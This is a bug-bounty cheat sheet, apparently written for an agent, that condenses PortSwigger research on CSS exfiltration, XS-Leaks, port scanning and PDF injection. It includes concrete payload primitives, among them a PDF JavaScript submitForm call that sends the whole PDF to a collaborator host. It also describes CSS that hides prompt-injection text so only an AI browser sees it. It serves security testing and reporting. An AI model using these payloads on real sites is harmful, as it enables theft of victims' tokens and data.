# CSS Exfiltration & XS-Leaks — Research Articles Compendium

> 13 PortSwigger Research articles (2018–2026). Scriptless theft — CSS, PDF, postMessage, port-scan — when JS/XSS is blocked.

## Article Map

| # | Article (year) | Core takeaway |
|---|---|---|
| 1 | uBlock, I exfiltrate (2021) | Poisoned filter rule = CSS site-wide; font keylogger |
| 2 | Blind CSS Exfiltration (2023) | Unknown pages: `:has` + `html` backgrounds + @import chain |
| 3 | Inline Style Exfiltration (2025) | `if(style(--val:"x"))` + image-set() conditionals |
| 4 | CSS: the bomb inside your inbox (2026) | Webmail: tokens under CSP, clipboard ATO, AI injection |
| 5 | XS-Leak: leaking IDs using focus (2019) | Fragment-scroll focus oracle enumerates ids |
| 6 | XS-Leak: detecting IDs using Portal (2019) | Portal ignores XFO; `:focus`/`:not` JS-free oracle |
| 7 | Safari hot-linking images (2022) | Safari OCR makes image pixels clickable links |
| 8 | Framing without iframes (2022) | object+param / embed `code=` primitives |
| 9 | Web message misconfigurations (2022) | DOM Invader: URL tokens postMessaged cross-origin |
| 10 | Abusing jQuery for CSS timing attacks (2019) | `$(location.hash)` + `:has` timing oracle |
| 11 | Browser-based intranet port scanning (2018) | iframe onload-count oracle; Chrome/Firefox/Edge |
| 12 | Portable Data exFiltration (2020) | PDF injection: annotation breakout, exfil, SSRF |
| 13 | Fickle PDFs (2024) | Widget vs field value render differs per viewer |

## Key Techniques

- **Attribute-selector token exfil**: `input[value^="a"]{--x:url(/a)}input{background:var(--x,none)}` — brute-force per char; sibling `+` or `div:has(input[value=..])` when the match can't render a background.
- **Blind exfil, unknown pages**: backgrounds on `html`; many vars, `none` fallback = multi-background slots; `html:has(input[name^="m"]):not(input[name="known"])` steps past known elements; @import chaining syncs chunks; timer not counter.
- **Inline style, no selectors**: `<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))'>` — nested ifs brute-force values; double quotes required; Chromium-only; plain strings work (no url()).
- **CSS inbox bomb (webmail)**: `<label for=..>` clicks trusted UI (Outlook); clipboard `<style>` + paste race (AOL/Yahoo) steals 12-hex login tokens — nested `^=`/`*=` selectors, 5 chars start/end + chunk correlation; CSP blocks externals? font-height oracle (descent-override) + animations count digit frequency, `inset:max(var(--x,100%),..)` surfaces matching link; `:before/:after` + opacity splits victim vs AI-browser view = prompt injection.
- **XS-Leaks focus/Portal**: iframe target once; loop `iframe.src=target#id` — onblur fires only for real ids, hash never hits server. `<portal src=target#id>` bypasses XFO; JS-free via `.x:focus{}` / `.x:not(:focus){background:url(..)}`.
- **jQuery CSS timing**: `$(location.hash)` in hashchange handler → binary-search chars with `:has(input[value^=..])`, time each probe (Red Hat case).
- **Port scanning**: Chrome — closed port rewrites URL to chrome-error://, `#`-click via named anchor fires 2nd onload; Firefox — onload only on valid ports, 1000-iframe pool, non-HTTP too; Edge inverted.
- **PDF exfil**: unescaped parens in annotation URI (PDF-Lib, jsPDF) → inject `/A<</S/JavaScript/JS(this.submitForm({cURL:'//collab'..}))` POSTs whole PDF (Acrobat); PDFium needs AcroForm widget; auto-exec via /AA PV/PC; blind SSRF via /FT/Tx + submitForm; cached resources dodge WAFs.
- **Fickle PDFs**: field shows £399 (Safari/Preview), widget annotation £999 (Chrome/Firefox/Drive) — invoice mutates at accounting.
- **Web message misconfig**: iframe URL embedding a secret; page postMessages it to any origin — listener exfil (DOM Invader).
- **Framing without iframes**: `<object type=text/html><param name=url value=..>` / `<embed code=..>`; chaining primitive, no XSS (null origin).
- **Safari hot-linking**: OCR yields links in images (http/https, no javascript:); attacker images host payload URLs on victim pages.
- **uBlock vector**: compromised filter list = site-wide CSS injection; unicode-range fonts exfil text nodes; image-set() evaded filter limits.

## Payload / Bypass Table

| Technique | Primitive | What leaks |
|---|---|---|
| Attribute selector | `input[value^="a"]` + var fallback | input values, token chars |
| :has exfil | `div:has(input[value=..])` | hidden inputs, unknown DOM |
| Multi-background | var slots on `html`, `none` fallback | many elements, unbounded requests |
| Inline style | `if(style(--val:"x"))` + image-set() | attr values, no stylesheet |
| @import chaining | server holds CSS responses | streaming exfil, large data |
| Focus XS-Leak | `target#id` + onblur | id existence, fingerprint |
| Portal XS-Leak | `<portal src>` (ignores XFO) | same where framing blocked |
| jQuery timing | `$(location.hash)` + `:has` timing | inputs via perf deltas |
| Port scan | iframe onload count / `#`-click | open intranet ports |
| PDF injection | `/S/JavaScript` + submitForm | whole PDF, blind SSRF |
| Fickle PDF | widget vs field value | viewer-dependent text |
| postMessage | iframe + cross-origin listener | URL-embedded secrets |

## By-Design / SKIP Filters

- Victim interaction required (click, paste, PDF open) → valid but note it; don't inflate severity.
- No sensitive data reachable (random ids, non-secret page existence) → INFORMATIONAL.
- CSS renders but exfil blocked (CSP) with no path → keep evidence, mark unproven.
- OCR hot-link on attacker image in attacker context → SKIP.

## Severity Guide

- **MED/HIGH**: token/secret exfil (login codes, CSRF, PDF contents, postMessage secrets) — scale by sensitivity + interaction.
- **LOW/MED**: existence oracles, port scans, fickle-PDF swap (raise if financial).
- **INFORMATIONAL**: rendering quirks (hot-linking), framing with no leak, blocked chains.

## Reporting Checklist

- [ ] Confirm CSS renders + OAST callback proof.
- [ ] State primitive and browser scope (Chromium if-style? Portal?).
- [ ] Show leak of a real sensitive value, or mark oracle-only.
- [ ] Document victim interaction + CSP bypass chain.
- [ ] PDFs: library, reader, auto-exec vs click.
- [ ] Per-victim unique exfil endpoints.
- [ ] Defense: escape PDF parens, restrict webmail CSS, validate postMessage.

> Master KB: agent-kb-bounty-exploit-master.md authority > SKILL.md. Unproven/blocked chain = INFORMATIONAL.
